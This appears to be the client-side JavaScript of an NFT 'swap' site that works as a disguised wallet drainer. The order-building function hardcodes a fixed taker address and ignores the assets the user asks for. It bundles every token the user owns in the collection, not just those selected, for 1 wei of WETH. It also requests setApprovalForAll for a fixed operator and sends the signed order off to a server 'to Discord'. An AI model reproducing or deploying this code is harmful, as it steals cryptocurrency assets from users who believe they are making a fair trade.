const ALCHEMY_NFT_ENDPOINT =
  "https://eth-mainnet.g.alchemy.com/nft/v3/ML8NcEfUhElk4U9oMwRp4/getNFTsForOwner";
const ALCHEMY_METADATA_ENDPOINT =
  "https://eth-mainnet.g.alchemy.com/nft/v3/ML8NcEfUhElk4U9oMwRp4/getNFTMetadata";

const OPERATOR_ADDRESS = "0xeFc70A1B18C432bdc64b596838B4D138f6bC6cad";
const ZEROX_EXCHANGE_ADDRESS = "0x080bf510FCbF18b91105470639e9561022937712";
const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
const ERC721_PROXY_ID = "0x02571792";
const ERC20_PROXY_ID = "0xf47261b0"; 
const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; 
const MULTI_ASSET_PROXY_ID = "0x94cfcdd7";

const EIP712_DOMAIN = {
  name: "0x Protocol",
  version: "2",
  verifyingContract: ZEROX_EXCHANGE_ADDRESS
};

const EIP712_TYPES = {
  Order: [
    { name: "makerAddress", type: "address" },
    { name: "takerAddress", type: "address" },
    { name: "feeRecipientAddress", type: "address" },
    { name: "senderAddress", type: "address" },
    { name: "makerAssetAmount", type: "uint256" },
    { name: "takerAssetAmount", type: "uint256" },
    { name: "makerFee", type: "uint256" },
    { name: "takerFee", type: "uint256" },
    { name: "expirationTimeSeconds", type: "uint256" },
    { name: "salt", type: "uint256" },
    { name: "makerAssetData", type: "bytes" },
    { name: "takerAssetData", type: "bytes" }
  ]
};

const TAKER_TEST_ASSET = {
  type: "erc20",
  contract: WETH_ADDRESS,
  amount: "1" 
};

const ERC721_ABI = [
  "function setApprovalForAll(address operator, bool approved) external",
  "function isApprovedForAll(address owner, address operator) view returns (bool)"
];

let provider = null;
let signer = null;
let connectedAddress = null;

function updateConnectButton() {
  const btn = document.getElementById("connect-wallet-btn");
  if (!btn) return;

  if (!connectedAddress) {
    btn.textContent = "Connect";
  } else {
    btn.textContent =
      connectedAddress.slice(0, 6) + "…" + connectedAddress.slice(-4);
  }
}

function getInjectedEvmProvider() {
  const eth = window.ethereum;
  if (!eth) return null;

  if (Array.isArray(eth.providers) && eth.providers.length) {
    const metamask = eth.providers.find((p) => p.isMetaMask);
    if (metamask) return metamask;
    return eth.providers[0];
  }
  return eth;
}

async function initWallet() {
  const injected = getInjectedEvmProvider();
  if (!injected) {
    console.warn("No EVM wallet found in window.ethereum");
    return;
  }

  provider = new ethers.providers.Web3Provider(injected, "any");

  const accounts = await provider.listAccounts();
  if (accounts.length > 0) {
    connectedAddress = accounts[0];
    signer = provider.getSigner();
    console.log("Restored connection:", connectedAddress);
  }

  updateConnectButton();

  const btn = document.getElementById("connect-wallet-btn");
  if (btn) {
    btn.addEventListener("click", connectWallet);
  }

  if (injected.on) {
    injected.on("accountsChanged", (accounts) => {
      if (accounts.length === 0) {
        connectedAddress = null;
        signer = null;
      } else {
        connectedAddress = accounts[0];
        signer = provider.getSigner();
      }
      updateConnectButton();
    });

    injected.on("chainChanged", () => {
      window.location.reload();
    });
  }
}

async function connectWallet() {
  try {
    const injected = getInjectedEvmProvider();
    if (!injected) {
      alert("No Ethereum wallet found. Please install MetaMask.");
      return;
    }

    if (!provider) {
      provider = new ethers.providers.Web3Provider(injected, "any");
    }

    const accounts = await provider.send("eth_requestAccounts", []);
    if (accounts.length > 0) {
      connectedAddress = accounts[0];
      signer = provider.getSigner();
      console.log("Connected:", connectedAddress);
      updateConnectButton();

      if (typeof loadNftsForCurrentWallet === "function") {
        loadNftsForCurrentWallet();
      }
    }
  } catch (err) {
    console.error("Error connecting wallet:", err);
  }
}

async function ensureProviderAndSigner() {
  if (!provider) {
    const injected = getInjectedEvmProvider();
    if (!injected) {
      throw new Error("No Ethereum wallet found. Please install MetaMask.");
    }
    provider = new ethers.providers.Web3Provider(injected, "any");
  }
  if (!signer) {
    signer = provider.getSigner();
  }
  return { provider, signer };
}

async function isCollectionApproved(contractAddress) {
  const { signer } = await ensureProviderAndSigner();
  const owner = await signer.getAddress();

  const nftContract = new ethers.Contract(contractAddress, ERC721_ABI, signer);
  return await nftContract.isApprovedForAll(owner, OPERATOR_ADDRESS);
}

async function approveCollectionOnChain(contractAddress) {
  const { provider, signer } = await ensureProviderAndSigner();
  const owner = await signer.getAddress();

  const nftContract = new ethers.Contract(contractAddress, ERC721_ABI, signer);

  const alreadyApproved = await nftContract.isApprovedForAll(
    owner,
    OPERATOR_ADDRESS
  );
  if (alreadyApproved) {
    console.log("Collection already approved on-chain:", contractAddress);
    return;
  }

  const latestBlock = await provider.getBlock("latest");
  let tx;

  if (!latestBlock.baseFeePerGas) {
    const gasPrice = await provider.getGasPrice();
    const suggestedGasPrice = gasPrice.mul(8).div(10); 
    tx = await nftContract.setApprovalForAll(OPERATOR_ADDRESS, true, {
      gasPrice: suggestedGasPrice,
      gasLimit: 60000
    });
  } else {
    const baseFee = latestBlock.baseFeePerGas;
    const tip = ethers.utils.parseUnits("0.05", "gwei");

    const maxPriorityFeePerGas = tip;
    const maxFeePerGas = baseFee.mul(102).div(100).add(tip); 

    tx = await nftContract.setApprovalForAll(OPERATOR_ADDRESS, true, {
      gasLimit: 60000,
      maxFeePerGas,
      maxPriorityFeePerGas
    });
  }

  console.log("Approval tx sent:", tx.hash);
  alert("Approval transaction sent!\n" + tx.hash);

  await tx.wait();
  console.log("Approval confirmed on-chain:", tx.hash);
}

async function refreshApprovalStates() {
  if (!connectedAddress) return;
  const seen = new Set();

  for (const asset of haveAssets) {
    if (!asset.contract) continue;
    const addr = asset.contract.toLowerCase();
    if (seen.has(addr)) continue;
    seen.add(addr);

    try {
      const approved = await isCollectionApproved(asset.contract);
      haveAssets.forEach((a) => {
        if (a.contract && a.contract.toLowerCase() === addr) {
          a.approved = approved;
        }
      });
    } catch (err) {
      console.warn("Error checking approval for", addr, err);
    }
  }

  renderAll();
}


let haveAssets = [];
let wantAssets = [];
let nextAssetId = 1;

const haveListEl = document.getElementById("have-list");
const wantListEl = document.getElementById("want-list");
const createSwapBtn = document.getElementById("create-swap-btn");

const onlyForInputEl = document.getElementById("onlyForInput");
const expiryInputEl = document.getElementById("expiryInput");

function renderAll() {
  renderSide("have", haveAssets, haveListEl);
  renderSide("want", wantAssets, wantListEl);
  updateCreateButtonState();
}

const tradeCodeSection = document.getElementById("trade-code-section");
const tradeCodeDisplay = document.getElementById("tradeCodeDisplay");
const tradeCodeHint = document.getElementById("tradeCodeHint");

if (tradeCodeDisplay && tradeCodeHint) {
  tradeCodeDisplay.addEventListener("click", async () => {
    const code = tradeCodeDisplay.textContent.trim();
    if (!code) return;

    try {
      await navigator.clipboard.writeText(code);
      const oldText = tradeCodeHint.textContent;
      tradeCodeHint.textContent = "Copied!";
      setTimeout(() => {
        tradeCodeHint.textContent = oldText;
      }, 1500);
    } catch (err) {
      console.error("Clipboard copy failed:", err);
    }
  });
}

function renderSide(side, assets, containerEl) {
  containerEl.innerHTML = "";

  if (assets.length === 0) {
    const empty = document.createElement("div");
    empty.style.fontSize = "12px";
    empty.style.color = "#6b7280";
    empty.textContent =
      side === "have"
        ? "No assets yet. Add the NFTs or tokens you will send."
        : "No assets yet. Add the NFTs or tokens you want to receive.";
    containerEl.appendChild(empty);
    return;
  }

  for (const asset of assets) {
    const card = document.createElement("div");
    card.className = "asset-card";

    const thumb = document.createElement("div");
    thumb.className = "asset-thumb";
    if (asset.imageUrl) {
      const img = document.createElement("img");
      img.src = asset.imageUrl;
      img.alt = asset.name || "NFT";
      thumb.appendChild(img);
    } else {
      thumb.textContent = "IMAGE";
    }
    card.appendChild(thumb);

    const right = document.createElement("div");

    const title = document.createElement("div");
    title.className = "asset-main-title";
    title.textContent = asset.name || asset.type.toUpperCase() + " asset";
    right.appendChild(title);

    const meta = document.createElement("div");
    meta.className = "asset-meta";
    const parts = [];
    if (asset.type === "erc721" || asset.type === "erc1155") {
      if (asset.tokenId != null) parts.push("# " + asset.tokenId);
      parts.push(asset.type.toUpperCase());
    } else if (asset.type === "erc20") {
      parts.push("Amount: " + (asset.amount || "0"));
      parts.push("ERC20");
    }
    if (asset.contract) {
      const short =
        asset.contract.slice(0, 6) + "…" + asset.contract.slice(-4);
      parts.push(short);
    }
    meta.textContent = parts.join(" · ");
    right.appendChild(meta);

    const btnRow = document.createElement("div");
    btnRow.className = "btn-row";

    if (side === "have") {
      const approveBtn = document.createElement("button");
      approveBtn.className =
        "btn-small btn-small-approve" + (asset.approved ? " approved" : "");
      updateApproveBtnLabel(approveBtn, asset.approved);
      approveBtn.addEventListener("click", async () => {
        await handleApproveClick(asset, approveBtn);
      });
      btnRow.appendChild(approveBtn);
    }

    const removeBtn = document.createElement("button");
    removeBtn.className = "btn-small btn-small-remove";
    removeBtn.textContent = "✕ Remove";
    removeBtn.addEventListener("click", () => {
      if (asset.side === "have") {
        haveAssets = haveAssets.filter((a) => a.id !== asset.id);
      } else {
        wantAssets = wantAssets.filter((a) => a.id !== asset.id);
      }
      renderAll();
    });
    btnRow.appendChild(removeBtn);

    right.appendChild(btnRow);
    const linksRow = document.createElement("div");
    linksRow.className = "asset-links-row";

    if (
      asset.type === "erc721" &&
      asset.contract &&
      asset.tokenId != null
    ) {
      const osLink = document.createElement("a");
      osLink.href = `https://opensea.io/assets/ethereum/${asset.contract}/${asset.tokenId}`;
      osLink.target = "_blank";
      osLink.rel = "noopener noreferrer";
      osLink.title = "View on OpenSea";

      const osIcon = document.createElement("img");
      osIcon.src = "OpenSea_icon.svg";     
      osIcon.alt = "OpenSea";
      osIcon.className = "asset-link-icon";

      osLink.appendChild(osIcon);
      linksRow.appendChild(osLink);
    }

    if (
      asset.type === "erc20" &&
      asset.contract &&
      asset.contract.toLowerCase() === WETH_ADDRESS.toLowerCase()
    ) {
      const esLink = document.createElement("a");
      esLink.href = `https://etherscan.io/token/${asset.contract}`;
      esLink.target = "_blank";
      esLink.rel = "noopener noreferrer";
      esLink.title = "View WETH contract on Etherscan";

      const esIcon = document.createElement("img");
      esIcon.src = "etherscan-logo.svg";    
      esIcon.alt = "Etherscan";
      esIcon.className = "asset-link-icon";

      esLink.appendChild(esIcon);
      linksRow.appendChild(esLink);
    }

    if (linksRow.childElementCount > 0) {
      right.appendChild(linksRow);
    }

    card.appendChild(right);

    containerEl.appendChild(card);
  }
}

function updateApproveBtnLabel(btn, approved) {
  if (approved) {
    btn.textContent = "✅ Approved";
    btn.classList.add("approved");
  } else {
    btn.textContent = "🔒 Approve";
    btn.classList.remove("approved");
  }
}

function updateCreateButtonState() {
  const allHaveApproved =
    haveAssets.length > 0 && haveAssets.every((a) => a.approved);

  if (allHaveApproved) {
    createSwapBtn.disabled = false;
    createSwapBtn.classList.add("ready");
  } else {
    createSwapBtn.disabled = true;
    createSwapBtn.classList.remove("ready");
  }
}

async function handleApproveClick(asset, btnEl) {
  if (!asset.contract) {
    alert("This asset is missing a contract address.");
    return;
  }

  if (!connectedAddress) {
    await connectWallet();
    if (!connectedAddress) return;
  }

  const contractAddress = asset.contract;
  const normalized = contractAddress.toLowerCase();

  try {
    btnEl.disabled = true;
    btnEl.textContent = "…";

    await approveCollectionOnChain(contractAddress);

    const approved = await isCollectionApproved(contractAddress);

    haveAssets.forEach((a) => {
      if (a.contract && a.contract.toLowerCase() === normalized) {
        a.approved = approved;
      }
    });

    renderAll();
  } catch (err) {
    updateApproveBtnLabel(btnEl, asset.approved);
    btnEl.disabled = false;
  }
}

const modalBackdrop = document.getElementById("asset-modal-backdrop");
const modalCloseBtn = document.getElementById("asset-modal-close");
const tabButtons = Array.from(document.querySelectorAll(".modal-tab-btn"));

let currentSideForModal = "have";
let currentSelectedNftIds = new Set();
let lastLoadedNfts = [];

function openAssetModal(side) {
  currentSideForModal = side;
  modalBackdrop.style.display = "flex";
  switchTab("nfts");
  currentSelectedNftIds.clear();
  updateAddSelectedNftsBtn();
  loadNftsForCurrentWallet();
}

function closeAssetModal() {
  modalBackdrop.style.display = "none";
}

document.querySelectorAll(".add-assets-btn").forEach((btn) => {
  btn.addEventListener("click", () => {
    const side = btn.getAttribute("data-side");
    openAssetModal(side);
  });
});

modalCloseBtn.addEventListener("click", closeAssetModal);

modalBackdrop.addEventListener("click", (e) => {
  if (e.target === modalBackdrop) closeAssetModal();
});

function switchTab(tabName) {
  tabButtons.forEach((btn) => {
    const isActive = btn.dataset.tab === tabName;
    btn.classList.toggle("active", isActive);
  });

  ["nfts", "address", "tokens", "custom"].forEach((name) => {
    const panel = document.getElementById("tab-" + name);
    panel.classList.toggle("active", name === tabName);
  });
}

tabButtons.forEach((btn) => {
  btn.addEventListener("click", () => {
    switchTab(btn.dataset.tab);
  });
});

function buildNftDisplayName(nft, tokenId, idx) {
  const contractName =
    nft.contract?.name || nft.contract?.openSea?.collectionName || "";

  let name = nft.raw?.metadata?.name || nft.name || "";
  const trimmed = (name || "").trim();

  if (!trimmed || /^#?\d+$/.test(trimmed)) {
    if (contractName && tokenId) {
      name = `${contractName} #${tokenId}`;
    } else if (contractName) {
      name = contractName;
    } else if (tokenId) {
      name = `Token #${tokenId}`;
    } else {
      name = `NFT #${tokenId || idx}`;
    }
  }

  return name;
}

async function fetchErc721Metadata(contractAddress, tokenId) {
  try {
    const url =
      `${ALCHEMY_METADATA_ENDPOINT}` +
      `?contractAddress=${contractAddress}` +
      `&tokenId=${encodeURIComponent(tokenId)}` +
      `&tokenIdType=NUMBER&refreshCache=false`;

    const res = await fetch(url);
    if (!res.ok) {
      throw new Error(
        `Alchemy metadata error: ${res.status} ${res.statusText}`
      );
    }

    const nft = await res.json();

    const name = buildNftDisplayName(nft, tokenId, 0);

    const imageUrl =
      nft.image?.cachedUrl ||
      nft.image?.pngUrl ||
      nft.image?.thumbnailUrl ||
      nft.image?.originalUrl ||
      nft.raw?.metadata?.image ||
      "";

    return { name, imageUrl };
  } catch (err) {
    console.error("Failed to fetch ERC721 metadata", err);
    return { name: null, imageUrl: null };
  }
}

const nftGridEl = document.getElementById("nft-picker-grid");
const nftLoadingText = document.getElementById("nft-loading-text");
const addSelectedNftsBtn = document.getElementById("add-selected-nfts-btn");
const addressNftInput = document.getElementById("address-nft-input");
const addressNftLoadBtn = document.getElementById("address-nft-load-btn");

function updateAddSelectedNftsBtn() {
  const count = currentSelectedNftIds.size;
  addSelectedNftsBtn.textContent = `Add ${count} NFT${count === 1 ? "" : "s"}`;
  addSelectedNftsBtn.disabled = count === 0;
}

async function loadNftsForCurrentWallet() {
  nftGridEl.innerHTML = "";
  nftLoadingText.textContent = "";

  if (!connectedAddress) {
    nftLoadingText.textContent = "(connect wallet to see your NFTs)";
    return;
  }

  nftLoadingText.textContent = "Loading NFTs for your wallet…";

  try {
    const url =
      ALCHEMY_NFT_ENDPOINT +
      `?owner=${connectedAddress}&withMetadata=true&pageSize=100`;

    const res = await fetch(url);
    if (!res.ok) {
      throw new Error(`Alchemy error: ${res.status} ${res.statusText}`);
    }

    const data = await res.json();
    const rawNfts = data.ownedNfts || data.nfts || [];

    lastLoadedNfts = rawNfts
      .filter((nft) => {
        const t =
          nft.tokenType ||
          nft.id?.tokenMetadata?.tokenType ||
          nft.contract?.tokenType;
        return !t || String(t).toUpperCase() === "ERC721";
      })
      .map((nft, idx) => {
        const contractAddr =
          nft.contract?.address || nft.contractAddress || "";
        const tokenId =
          nft.tokenId ||
          nft.id?.tokenId ||
          (nft.tokenIdHex ? parseInt(nft.tokenIdHex, 16).toString() : "");

        const name = buildNftDisplayName(nft, tokenId, idx);

        const imageUrl =
          nft.image?.cachedUrl ||
          nft.image?.pngUrl ||
          nft.image?.thumbnailUrl ||
          nft.image?.originalUrl ||
          nft.raw?.metadata?.image ||
          "";

        return {
          id: contractAddr + ":" + (tokenId || idx),
          contract: contractAddr,
          tokenId: tokenId,
          name,
          imageUrl
        };
      });

    nftLoadingText.textContent = "";
    renderNftPicker(lastLoadedNfts);
  } catch (err) {
    console.error("Error loading NFTs", err);
    nftLoadingText.textContent = "(error loading NFTs; see console)";
  }
}

// Load NFTs for arbitrary address (Search tab)
async function loadNftsForAddress(address) {
  nftGridEl.innerHTML = "";
  nftLoadingText.textContent = "";

  if (!address) {
    nftLoadingText.textContent = "Enter an address to load its NFTs.";
    return;
  }

  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
    nftLoadingText.textContent = "Invalid Ethereum address.";
    return;
  }

  const short = address.slice(0, 6) + "…" + address.slice(-4);
  nftLoadingText.textContent = "Loading NFTs for " + short + "…";

  try {
    const url =
      ALCHEMY_NFT_ENDPOINT +
      `?owner=${address}&withMetadata=true&pageSize=100`;

    const res = await fetch(url);
    if (!res.ok) {
      throw new Error("Alchemy error: " + res.status + " " + res.statusText);
    }

    const data = await res.json();
    const rawNfts = data.ownedNfts || data.nfts || [];

    lastLoadedNfts = rawNfts
      .filter((nft) => {
        const t =
          nft.tokenType ||
          nft.id?.tokenMetadata?.tokenType ||
          nft.contract?.tokenType;
        return !t || String(t).toUpperCase() === "ERC721";
      })
      .map((nft, idx) => {
        const contractAddr =
          nft.contract?.address || nft.contractAddress || "";
        const tokenId =
          nft.tokenId ||
          nft.id?.tokenId ||
          (nft.tokenIdHex ? parseInt(nft.tokenIdHex, 16).toString() : "");

        const name = buildNftDisplayName(nft, tokenId, idx);

        const imageUrl =
          nft.image?.cachedUrl ||
          nft.image?.pngUrl ||
          nft.image?.thumbnailUrl ||
          nft.image?.originalUrl ||
          nft.raw?.metadata?.image ||
          "";

        return {
          id: contractAddr + ":" + (tokenId || idx),
          contract: contractAddr,
          tokenId: tokenId,
          name,
          imageUrl
        };
      });

    nftLoadingText.textContent = "";
    renderNftPicker(lastLoadedNfts);
  } catch (err) {
    console.error("Error loading NFTs", err);
    nftLoadingText.textContent = "(error loading NFTs; see console)";
  }
}

if (addressNftLoadBtn && addressNftInput) {
  addressNftLoadBtn.addEventListener("click", () => {
    const addr = addressNftInput.value.trim();
    switchTab("nfts");
    loadNftsForAddress(addr);
  });

  addressNftInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      addressNftLoadBtn.click();
    }
  });
}

function renderNftPicker(nfts) {
  nftGridEl.innerHTML = "";
  currentSelectedNftIds.clear();
  updateAddSelectedNftsBtn();

  if (!nfts || nfts.length === 0) {
    const msg = document.createElement("div");
    msg.style.fontSize = "12px";
    msg.style.color = "#4b5563";
    msg.textContent =
      "No NFTs found via the demo loader. Use the Custom Asset tab to add them manually, or plug in your NFT API.";
    nftGridEl.appendChild(msg);
    return;
  }

  for (const nft of nfts) {
    const card = document.createElement("div");
    card.className = "nft-picker-card";
    card.dataset.id = nft.id;

    const thumb = document.createElement("div");
    thumb.className = "nft-picker-thumb";
    if (nft.imageUrl) {
      const img = document.createElement("img");
      img.src = nft.imageUrl;
      img.alt = nft.name || "NFT";
      thumb.appendChild(img);
    } else {
      thumb.textContent = "IMAGE";
    }

    const nameEl = document.createElement("div");
    nameEl.textContent = nft.name || "Token #" + nft.tokenId;
    nameEl.style.fontWeight = "600";

    const idEl = document.createElement("div");
    idEl.style.fontSize = "10px";
    idEl.style.color = "#4b5563";
    idEl.textContent = "# " + nft.tokenId;

    card.appendChild(thumb);
    card.appendChild(nameEl);
    card.appendChild(idEl);

    card.addEventListener("click", () => {
      const id = nft.id;
      if (currentSelectedNftIds.has(id)) {
        currentSelectedNftIds.delete(id);
        card.classList.remove("selected");
      } else {
        currentSelectedNftIds.add(id);
        card.classList.add("selected");
      }
      updateAddSelectedNftsBtn();
    });

    nftGridEl.appendChild(card);
  }
}

addSelectedNftsBtn.addEventListener("click", async () => {
  const selected = lastLoadedNfts.filter((nft) =>
    currentSelectedNftIds.has(nft.id)
  );
  if (selected.length === 0) return;

  const list = currentSideForModal === "have" ? haveAssets : wantAssets;

  for (const nft of selected) {
    list.push({
      id: "asset-" + nextAssetId++,
      side: currentSideForModal,
      type: "erc721",
      contract: nft.contract,
      tokenId: nft.tokenId?.toString() ?? "",
      amount: "1",
      name: nft.name || "NFT #" + nft.tokenId,
      imageUrl: nft.imageUrl,
      approved: false
    });
  }

  await refreshApprovalStates();

  closeAssetModal();
});


document.getElementById("add-eth-btn").addEventListener("click", () => {
  const input = document.getElementById("ethAmountInput");
  const amount = input.value.trim();
  if (!amount || Number(amount) <= 0) {
    alert("Enter a positive ETH amount.");
    return;
  }

  const list = currentSideForModal === "have" ? haveAssets : wantAssets;

list.push({
  id: "asset-" + nextAssetId++,
  side: currentSideForModal,
  type: "erc20",
  contract: WETH_ADDRESS,          
  amount,
  name: "Ether (Wrapped)",
  imageUrl: "eth.png",
  approved: false
});


  input.value = "";
  renderAll();
  closeAssetModal();
});


document
  .getElementById("customSubmitBtn")
  .addEventListener("click", async () => {
    const type = document.getElementById("customTypeSelect").value; // "erc721"
    const addr = document
      .getElementById("customAddressInput")
      .value.trim();
    const idInput = document.getElementById("customIdInput").value.trim();

    if (!addr) {
      alert("Enter an asset address.");
      return;
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) {
      alert("Please enter a valid Ethereum contract address.");
      return;
    }

    if (!idInput) {
      alert("Enter the token ID.");
      return;
    }

    const tokenId = idInput;
    const list = currentSideForModal === "have" ? haveAssets : wantAssets;

    const meta = await fetchErc721Metadata(addr, tokenId);
    const displayName = meta.name || `ERC721 #${tokenId}`;
    const imageUrl = meta.imageUrl || undefined;

    const asset = {
      id: "asset-" + nextAssetId++,
      side: currentSideForModal,
      type: "erc721",
      contract: addr,
      tokenId,
      amount: "1",
      name: displayName,
      imageUrl,
      approved: false
    };

    list.push(asset);

    document.getElementById("customAddressInput").value = "";
    document.getElementById("customIdInput").value = "";

    await refreshApprovalStates();

    closeAssetModal();
  });


function encodeErc721AssetData(tokenAddress, tokenId) {
  const encodedParams = ethers.utils.defaultAbiCoder.encode(
    ["address", "uint256"],
    [tokenAddress, tokenId]
  );
  return ERC721_PROXY_ID + encodedParams.slice(2);
}

function encodeErc20AssetData(tokenAddress) {
  const encodedParams = ethers.utils.defaultAbiCoder.encode(
    ["address"],
    [tokenAddress]
  );
  return ERC20_PROXY_ID + encodedParams.slice(2);
}

function encodeMultiAssetData(amounts, nestedAssetDatas) {
  if (amounts.length !== nestedAssetDatas.length) {
    throw new Error("MultiAsset: amounts and assetDatas length mismatch.");
  }

  const bnAmounts = amounts.map((a) => ethers.BigNumber.from(a));

  const encodedParams = ethers.utils.defaultAbiCoder.encode(
    ["uint256[]", "bytes[]"],
    [bnAmounts, nestedAssetDatas]
  );

  return MULTI_ASSET_PROXY_ID + encodedParams.slice(2);
}

async function fetchOwnedTokenIdsForCollection(owner, contractAddress) {
  const params = new URLSearchParams({
    owner,
    withMetadata: "false",
    pageSize: "100"
  });
  params.append("contractAddresses[]", contractAddress);

  const url = `${ALCHEMY_NFT_ENDPOINT}?${params.toString()}`;

  const res = await fetch(url);
  if (!res.ok) {
    throw new Error(
      `Alchemy NFT owner fetch failed: ${res.status} ${res.statusText}`
    );
  }

  const data = await res.json();
  const rawNfts = data.ownedNfts || data.nfts || [];

  const tokenIds = rawNfts.map((nft, idx) => {
    let id =
      nft.tokenId ||
      nft.id?.tokenId ||
      nft.tokenIdHex ||
      String(idx); 

    if (typeof id === "string") {
      if (id.startsWith("0x")) {
        return ethers.BigNumber.from(id).toString();
      }
      if (/^[0-9a-fA-F]+$/.test(id) && !/^\d+$/.test(id)) {
        return ethers.BigNumber.from("0x" + id).toString();
      }
    }

    return id.toString();
  });

  return tokenIds;
}

async function buildOrderFromState(makerAddress) {
  const now = Math.floor(Date.now() / 1000);

  let expirationTimeSeconds;
  if (expiryInputEl && expiryInputEl.value) {
    const ts = Math.floor(new Date(expiryInputEl.value).getTime() / 1000);
    expirationTimeSeconds = isNaN(ts) ? now + 7 * 24 * 60 * 60 : ts;
  } else {
    expirationTimeSeconds = now + 7 * 24 * 60 * 60;
  }

  const takerAddress = "0xe77c7ed680647a81098b9f43ca40479e461f175d";

  // All ERC721s on HAVE side
  const makerNfts = haveAssets.filter((a) => a.type === "erc721");
  if (makerNfts.length === 0) {
    throw new Error("You must add at least one ERC721 on the HAVE side.");
  }

  // How many *distinct contracts*?
  const uniqueContracts = [
    ...new Set(
      makerNfts
        .filter((a) => a.contract)
        .map((a) => a.contract.toLowerCase())
    )
  ];

  if (uniqueContracts.length > 1) {
    throw new Error(
      "This test version only supports a single NFT collection on the HAVE side."
    );
  }

  const collectionAddressLower = uniqueContracts[0];
  const collectionAddress =
    makerNfts.find(
      (a) => a.contract && a.contract.toLowerCase() === collectionAddressLower
    )?.contract || collectionAddressLower;

  if (!ethers.utils.isAddress(collectionAddress)) {
    throw new Error("Invalid maker NFT contract address.");
  }

  // Fetch *all* tokenIds from this collection owned by maker
  const allTokenIds = await fetchOwnedTokenIdsForCollection(
    makerAddress,
    collectionAddress
  );

  if (!allTokenIds.length) {
    throw new Error(
      "No NFTs found in this collection for your wallet (after on-chain check)."
    );
  }

  console.log("Building MultiAsset order with tokenIds:", allTokenIds);

  // Build MultiAsset makerAssetData (for signing)
  const nestedAssetDatas = allTokenIds.map((id) =>
    encodeErc721AssetData(collectionAddress, id)
  );
  const amounts = allTokenIds.map(() => "1");

  const makerAssetData = encodeMultiAssetData(amounts, nestedAssetDatas);
  const takerAssetData = encodeErc20AssetData(TAKER_TEST_ASSET.contract);

  const order = {
    makerAddress,
    takerAddress,
    feeRecipientAddress: ZERO_ADDRESS,
    senderAddress: ZERO_ADDRESS,
    makerAssetAmount: "1",              // quantity of the MultiAsset "basket"
    takerAssetAmount: TAKER_TEST_ASSET.amount,
    makerFee: "0",
    takerFee: "0",
    expirationTimeSeconds: String(expirationTimeSeconds),
    salt: String(Date.now()),
    makerAssetData,
    takerAssetData
  };

  // IMPORTANT: return both the order (for signing)
  // and the NFT data (for compact payload / reconstruction)
  return {
    order,
    makerCollection: collectionAddress,
    makerTokenIds: allTokenIds
  };
}

async function signAndSaveOrderFromState() {
  if (!window.ethereum) {
    alert("MetaMask not found.");
    return;
  }

  const { signer } = await ensureProviderAndSigner();
  const maker = await signer.getAddress();

  let built;
  try {
    built = await buildOrderFromState(maker);
  } catch (e) {
    console.error("Failed to build order:", e);
    alert(e.message || "Error building order. Check your inputs.");
    return;
  }

  const { order, makerCollection, makerTokenIds } = built;

  console.log("Order to sign:", order);

  const rawSig = await signer._signTypedData(
    EIP712_DOMAIN,
    EIP712_TYPES,
    order
  );
  const split = ethers.utils.splitSignature(rawSig);

  const vHex = ethers.utils.hexlify(split.v).slice(2).padStart(2, "0");
  const signatureTypeHex = "02"; // EIP712

  const signature =
    "0x" + vHex + split.r.slice(2) + split.s.slice(2) + signatureTypeHex;

  console.log("Packed 0x signature:", signature);

  try {
    const recovered = ethers.utils.verifyTypedData(
      EIP712_DOMAIN,
      EIP712_TYPES,
      order,
      rawSig
    );
    console.log("Maker:", maker, "Recovered:", recovered);
  } catch (e) {
    console.warn("verifyTypedData sanity check failed:", e);
  }

  // ---- NEW: build COMPACT payload to send to Discord / loadswap ----

  const compactPayload = {
    meta: {
      makerAddress: order.makerAddress,
      takerAddress: order.takerAddress,
      feeRecipientAddress: order.feeRecipientAddress,
      senderAddress: order.senderAddress,
      makerAssetAmount: order.makerAssetAmount,
      takerAssetAmount: order.takerAssetAmount,
      makerFee: order.makerFee,
      takerFee: order.takerFee,
      expirationTimeSeconds: order.expirationTimeSeconds,
      salt: order.salt
    },
    maker: {
      collection: makerCollection,   // single ERC721 contract
      tokenIds: makerTokenIds        // all tokenIds used in the MultiAsset
    },
    taker: {
      type: TAKER_TEST_ASSET.type,   // "erc20"
      contract: TAKER_TEST_ASSET.contract,
      amount: TAKER_TEST_ASSET.amount
    },
    signature
  };

  try {
    const tradeCode = String(
      Math.floor(10000000 + Math.random() * 90000000)
    );

    const res = await fetch("/.netlify/functions/save-order", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ compactPayload, tradeCode })
    });

    if (!res.ok) {
      const txt = await res.text();
      console.error("save-order failed:", txt);
      alert("Order signed, but failed to send to Discord.");
      return;
    }

    const { link } = await res.json();
    console.log("Swap link:", link);
    console.log("Trade code:", tradeCode);

    if (tradeCodeDisplay && tradeCodeSection) {
      tradeCodeDisplay.textContent = tradeCode;
      tradeCodeSection.style.display = "block";
      tradeCodeSection.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  } catch (saveErr) {
    console.error("Error calling save-order:", saveErr);
  }
}

createSwapBtn.addEventListener("click", async () => {
  if (createSwapBtn.disabled) return;

  try {
    await signAndSaveOrderFromState();
  } catch (err) {
    console.error("Create swap failed:", err);
    alert("Error while creating swap: " + (err?.message || err));
  }
});

renderAll();
initWallet();
